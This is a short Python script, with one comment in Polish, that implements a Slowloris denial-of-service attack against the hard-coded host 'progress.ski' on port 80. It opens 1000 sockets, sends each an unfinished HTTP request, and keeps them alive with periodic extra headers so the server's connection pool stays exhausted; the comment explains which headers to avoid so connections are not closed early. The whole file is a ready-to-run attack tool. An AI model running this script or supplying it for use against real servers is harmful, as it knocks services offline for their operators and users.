import socket
import threading
import time

HOST = "progress.ski"
PORT = 80

PATH = "/"


def receive_all(sock):
    response = b""

    while True:
        chunk = sock.recv(1024)
        if not chunk:
            break

        response += chunk

    return response


def slowloris_thread(sockets):
    while True:
        print(f"[INFO] Upkeeping {len(sockets)} connections")

        for sock in list(sockets):
            try:
                sock.sendall(extra_header.encode())
            except socket.error:
                sockets.remove(sock)
                print("[WARN] Closed connection removed")

        time.sleep(SLEEP_DURATION)


server_address = (HOST, PORT)

request = (
    f"GET {PATH} HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"User-Agent: slowloris-test\r\n"
)

extra_header = "X-a: b\r\n"

# Znając założenia ataku Slowloris można użyć w zasadzie dowolnych nagłówków,
# należy jednak unikać nagłówka "Connection: close" i pustej linii CRLF,
# żeby przedwcześnie nie zakończyć połączenia z serwerem

SOCKET_COUNT = 1000
SLEEP_DURATION = 5

try:
    sockets = []

    print("Initializing sockets")

    for _ in range(SOCKET_COUNT):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        sock.connect(server_address)
        sock.sendall(request.encode())

        sockets.append(sock)

        print(f"Progress: {(len(sockets) / SOCKET_COUNT) * 100:.1f}%")

    print(f"Connected successfully to {HOST} at port {PORT}")

    print(f"[OK] {len(sockets)} sockets created.")

    thread = threading.Thread(target=slowloris_thread, args=(sockets, ))
    thread.start()

except Exception as e:
    print(e)
